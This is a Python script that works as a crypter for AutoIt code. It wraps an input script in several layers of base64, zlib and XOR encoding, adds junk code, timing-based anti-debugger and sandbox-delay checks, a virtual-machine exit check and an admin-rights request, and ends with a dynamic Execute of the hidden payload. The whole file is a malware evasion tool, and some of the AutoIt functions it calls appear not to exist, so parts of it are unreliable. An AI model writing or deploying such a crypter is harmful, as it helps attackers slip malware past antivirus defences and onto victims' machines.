import sys
import zlib
import random
import string
import base64

def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def generate_junk_code():
    junk_code = []
    for _ in range(random.randint(10, 25)):
        var_name = ''.join(random.choice(string.ascii_letters) for _ in range(5))
        fun_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        junk_code.append(f"Local ${var_name} = {random.randint(1, 100)} * {random.randint(1, 100)}")
        junk_code.append(f"\nFunc {fun_name}()\n\t{var_name}_{fun_name} = {random.randint(1, 1000)}/{random.randint(1, 500)}\nEndFunc\n")
    return ''.join(junk_code)

def insert_random_junk_blocks(code_parts):
    code_with_junk = []
    for part in code_parts:
        while random.random() > 0.40:
            junk = generate_junk_code()
            code_with_junk.append(junk)
        code_with_junk.append(part)
        while random.random() > 0.30:
            junk = generate_junk_code()
            code_with_junk.append(junk)
    return '\n'.join(code_with_junk)

def anti_debugger_checks():
    fn = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    return f'''
Func {fn}()
    Local $iStartTime = TimerInit()
    For $i = 1 To 1000000
        ; Dummy loop
    Next
    If TimerDiff($iStartTime) > 1000 Then
        Exit
    EndIf
EndFunc

{fn}()
'''

def random_delay_code():
    fn = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    return f"""
Func {fn}()
    Local $delay = Random(5000, 15000, 1)
    Sleep($delay)
EndFunc

{fn}()
"""

def anti_reverse_engineering_checks():
    fn = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    return f'''
Func {fn}()
    Local $sFile = FileGetShortName(@ScriptFullPath)
    If FileExists($sFile & "_debugger") Or FileExists("/etc/ld.so.preload") Then
        Exit
    EndIf
EndFunc

{fn}()
'''

def split_encoded_data(encoded_code, chunk_size=30):
    return [encoded_code[i:i + chunk_size] for i in range(0, len(encoded_code), chunk_size)]

def obfuscate_autoit_code(code, encryption_key):
    encoded_code = base64.b64encode(xor_encrypt(code, encryption_key).encode()).decode()
    encoded_chunks = split_encoded_data(encoded_code)
    decryption_key_name = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    val1 = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    val2 = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    val3 = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    val4 = "".join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
    obfuscated_code = f'''
Global ${val1} = ""
'''
    for i, chunk in enumerate(encoded_chunks):
        obfuscated_code += f'${val1} &= "{chunk}"\n'
    obfuscated_code += f'''

Func {decryption_key_name}(${val4}, ${val3})
    Local $result = ""
    For $i = 1 To StringLen(${val4})
        $result &= Chr(BitXOR(Asc(StringMid(${val4}, $i, 1)), Asc(StringMid(${val3}, Mod($i - 1, StringLen(${val3})) + 1, 1))))
    Next
    Return $result
EndFunc

Global ${val3} = "{encryption_key}"
Global ${val2} = BinaryToString({decryption_key_name}(${val1}, ${val3}))

Execute(${val2})
'''
    code_parts = [
        anti_debugger_checks(),
        anti_reverse_engineering_checks(),
        random_delay_code(),
        obfuscated_code
    ]
    final_code = insert_random_junk_blocks(code_parts)
    return final_code

def obfuscate_with_base64(code):
    enc = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    return f'Execute(BinaryToString(Base64Decode("{enc}")))'

def obfuscate_with_zlib(code):
    enc = base64.b64encode(zlib.compress(code.encode('utf-8'))).decode('utf-8')[::-1]
    return f'Execute(BinaryToString(DecString(BinaryToString(Base64Decode("{enc}")))))'

try:
    code_name = sys.argv[1] if len(sys.argv) > 1 else "main.au3"
    with open(code_name, 'r') as f:
        code = f.read()
    for _ in range(3):
        code = obfuscate_with_base64(code) if random.random() > 0.5 else obfuscate_with_zlib(code)
    code = obfuscate_with_base64(code)
    encryption_key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    code = obfuscate_autoit_code(code, encryption_key)
    f1 = ''.join(random.choice(string.ascii_letters) for _ in range(15))
    f2 = ''.join(random.choice(string.ascii_letters) for _ in range(15))
    final_code = f"""#RequireAdmin
#include <FileConstants.au3>
#include <AutoItConstants.au3>
#include <WinAPIFiles.au3>
#include <InetConstants.au3>
#include <WinAPIProc.au3>
#include <WinAPIInternals.au3>
#include <Security.au3>

Func {f1}()
    {f2}()
    Local $isVM = _Security_IsVirtualMachine()
    If $isVM Then Exit
EndFunc

Func {f2}()
    Local $delay = Random(5000, 15000, 1)
    Sleep($delay)
EndFunc

{f1}()
""" + code
    out_name = f"{code_name.split('.')[0]}_enc.au3"
    with open(out_name, 'w') as f:
        f.write(final_code)
    print(f"Obfuscated code saved as {out_name}")
except Exception as e:
    print(f"An error occurred: {e}")
